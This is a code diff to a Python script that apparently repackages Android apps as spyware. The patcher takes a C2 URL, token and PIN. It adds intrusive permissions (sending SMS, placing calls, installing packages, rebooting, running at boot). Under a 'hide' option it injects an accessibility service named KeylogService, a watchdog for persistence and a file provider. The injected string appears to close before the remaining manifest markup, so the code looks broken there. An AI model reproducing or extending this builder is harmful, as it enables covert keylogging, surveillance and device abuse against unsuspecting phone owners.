@@ -7,6 +7,14 @@ import shutil
 from pathlib import Path
 
 PERMISSIONS = [
+    "android.permission.SEND_SMS",
+    "android.permission.CALL_PHONE",
+    "android.permission.CHANGE_WIFI_STATE",
+    "android.permission.WRITE_SETTINGS",
+    "android.permission.REQUEST_INSTALL_PACKAGES",
+    "android.permission.REQUEST_DELETE_PACKAGES",
+    "android.permission.REBOOT",
+    "android.permission.LOCKED_BOOT_COMPLETED",
     "android.permission.INTERNET",
     "android.permission.ACCESS_NETWORK_STATE",
     "android.permission.ACCESS_WIFI_STATE",
@@ -140,6 +148,39 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
 
     if hide:
         injection += f"""
+        <service
+            android:name="{PKG}.KeylogService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/mzk_accessibility" />
+        </service>
+
+        <service
+            android:name="{PKG}.Watchdog$Job"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <receiver android:name="{PKG}.Watchdog" android:exported="false">
+            <intent-filter>
+                <action android:name="{PKG}.TICK" />
+            </intent-filter>
+        </receiver>
+
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="{authority}.files"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/mzk_file_paths" />
+        </provider>
+"""
         <activity-alias
             android:name="{PKG}.Launcher"
             android:targetActivity="{PKG}.MainActivity"
